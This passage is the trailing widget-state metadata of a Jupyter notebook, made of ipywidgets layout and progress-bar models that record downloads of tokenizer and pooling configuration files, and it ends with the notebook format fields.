            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0c8d2ccac6414bfb9159b20fa1195022": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d7f8c12895884723b95ae1e35a87ebd3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_8057edbebafb4c63b0a59c3ee285305a",
              "IPY_MODEL_0b4ff7e5ae1e40b48868799aa5bfdfcf",
              "IPY_MODEL_5f669c5ae045451493684c2f2ffa7a28"
            ],
            "layout": "IPY_MODEL_86fe0bd349be44f8a5fc51756c60a11b"
          }
        },
        "8057edbebafb4c63b0a59c3ee285305a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_447b2870af794d1eb4a24891bc5c622a",
            "placeholder": "​",
            "style": "IPY_MODEL_fb77a09a32b74857ba2be8cdbe0dae7b",
            "value": "tokenizer.json: 100%"
          }
        },
        "0b4ff7e5ae1e40b48868799aa5bfdfcf": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_0d363901eb394a54a403f7a0474d21d5",
            "max": 711396,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_bc3e68b46c1d4508b37f36cfb5d09b92",
            "value": 711396
          }
        },
        "5f669c5ae045451493684c2f2ffa7a28": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_18fd0cd029364379b5db801c997092cf",
            "placeholder": "​",
            "style": "IPY_MODEL_84c064a653f84c8688a4bff8e06bf206",
            "value": " 711k/711k [00:00&lt;00:00, 19.4MB/s]"
          }
        },
        "86fe0bd349be44f8a5fc51756c60a11b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "447b2870af794d1eb4a24891bc5c622a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fb77a09a32b74857ba2be8cdbe0dae7b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "0d363901eb394a54a403f7a0474d21d5": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "bc3e68b46c1d4508b37f36cfb5d09b92": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "18fd0cd029364379b5db801c997092cf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "84c064a653f84c8688a4bff8e06bf206": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c67c0489ef294a669b448a3988ef7976": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_ce8860ec051d448ba64c4a845a419e43",
              "IPY_MODEL_da43f32381d846fb958f191f25bfe20e",
              "IPY_MODEL_76f3e26fd6c9445e96fb0eceac983174"
            ],
            "layout": "IPY_MODEL_faa303c4d02c4c0eabc19a1c351d8683"
          }
        },
        "ce8860ec051d448ba64c4a845a419e43": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_937d7f9807234292b743e48cff16fa04",
            "placeholder": "​",
            "style": "IPY_MODEL_a5950174b89243e59403074011337135",
            "value": "special_tokens_map.json: 100%"
          }
        },
        "da43f32381d846fb958f191f25bfe20e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_21d2a6b8cdc04bd9a59e756982dc3858",
            "max": 125,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_6e5378c380ac448aa8adcd41e48eb1c3",
            "value": 125
          }
        },
        "76f3e26fd6c9445e96fb0eceac983174": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_94234135a607416aa7061e6011dda43a",
            "placeholder": "​",
            "style": "IPY_MODEL_9ceb225a99d94aa4b942a4b4485ec571",
            "value": " 125/125 [00:00&lt;00:00, 5.90kB/s]"
          }
        },
        "faa303c4d02c4c0eabc19a1c351d8683": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "937d7f9807234292b743e48cff16fa04": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a5950174b89243e59403074011337135": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "21d2a6b8cdc04bd9a59e756982dc3858": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6e5378c380ac448aa8adcd41e48eb1c3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "94234135a607416aa7061e6011dda43a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9ceb225a99d94aa4b942a4b4485ec571": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "545fe363b08942c2adf1b118421d3d3c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_20490fa095eb47b9a8cd96d8ecf700eb",
              "IPY_MODEL_0ed194f21ddf4c08879a8787bc16b6e2",
              "IPY_MODEL_9294b5aa90cd423c9ae9efdfb9550771"
            ],
            "layout": "IPY_MODEL_4ae7718af274444a8dfd167dfafeed44"
          }
        },
        "20490fa095eb47b9a8cd96d8ecf700eb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9b93818a9d044ddfbed5ae23ee755d44",
            "placeholder": "​",
            "style": "IPY_MODEL_c11699a45f84428f90172a6618bf685a",
            "value": "1_Pooling/config.json: 100%"
          }
        },
        "0ed194f21ddf4c08879a8787bc16b6e2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_cd611e02563946ed93f1d50c738f70de",
            "max": 190,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_16981fbcfa914cf895b306a3d49afa9f",
            "value": 190
          }
        },
        "9294b5aa90cd423c9ae9efdfb9550771": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_885d9e676c464f248bb10d9c3ffa724d",
            "placeholder": "​",
            "style": "IPY_MODEL_0a2d956764e44eb3a827c71b52a5daeb",
            "value": " 190/190 [00:00&lt;00:00, 11.6kB/s]"
          }
        },
        "4ae7718af274444a8dfd167dfafeed44": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9b93818a9d044ddfbed5ae23ee755d44": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c11699a45f84428f90172a6618bf685a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "cd611e02563946ed93f1d50c738f70de": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "16981fbcfa914cf895b306a3d49afa9f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "885d9e676c464f248bb10d9c3ffa724d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0a2d956764e44eb3a827c71b52a5daeb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}